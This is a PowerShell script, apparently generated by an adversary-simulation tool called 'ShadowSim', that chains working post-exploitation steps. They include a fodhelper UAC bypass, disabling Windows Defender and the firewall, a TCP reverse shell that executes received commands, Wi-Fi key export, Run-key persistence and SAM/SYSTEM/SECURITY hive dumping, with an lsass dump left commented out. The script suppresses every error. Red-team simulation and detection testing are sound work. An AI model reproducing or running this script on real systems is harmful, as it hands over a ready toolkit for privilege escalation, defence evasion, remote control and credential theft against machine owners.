# Generated by ShadowSim
# Timestamp: 2025-08-03 15:11:55.328368

if ($PSVersionTable.PSVersion.Major -lt 5) { exit }

# --- UAC Bypass ---
try {
  $key = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
  New-Item -Path $key -Force | Out-Null
  Set-ItemProperty -Path $key -Name "DelegateExecute" -Value ""
  Set-ItemProperty -Path $key -Name "(default)" -Value "powershell -Command Start-Process powershell -Verb runAs"
  Start-Process "fodhelper.exe"
  Start-Sleep -Seconds 2
  Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
} catch {}

# --- Defender Bypass ---
try {
  Set-MpPreference -DisableRealtimeMonitoring $true
  Add-MpPreference -ExclusionPath 'C:\Users\Public'
} catch {}

# --- Firewall Disable ---
try {
  Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
} catch {}

# --- Reverse Shell ---
try {
  $client = New-Object System.Net.Sockets.TCPClient("127.0.0.1",4444)
  $stream = $client.GetStream()
  [byte[]]$bytes = 0..65535|%{0}
  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
  }
  $client.Close()
} catch {}

# --- Recon ---
try {
  systeminfo | Out-File C:\Users\Public\sysinfo.txt
  whoami /all | Out-File C:\Users\Public\tokens.txt
  netsh wlan export profile key=clear folder=C:\Users\Public
} catch {}

# --- Persistence ---
try {
  $path = "C:\Users\Public\script.ps1"
  New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ShadowSimTask" -Value "powershell -ExecutionPolicy Bypass -File $path" -PropertyType String -Force
} catch {}

# --- Cred Dump ---
try {
  reg save HKLM\SAM C:\Users\Public\sam.bak
  reg save HKLM\SYSTEM C:\Users\Public\system.bak
  reg save HKLM\SECURITY C:\Users\Public\security.bak
  tasklist /FI "IMAGENAME eq lsass.exe"
  # Optional: procdump method
  # Start-Process "procdump.exe" -ArgumentList "-ma lsass.exe C:\Users\Public\lsass.dmp"
} catch {}
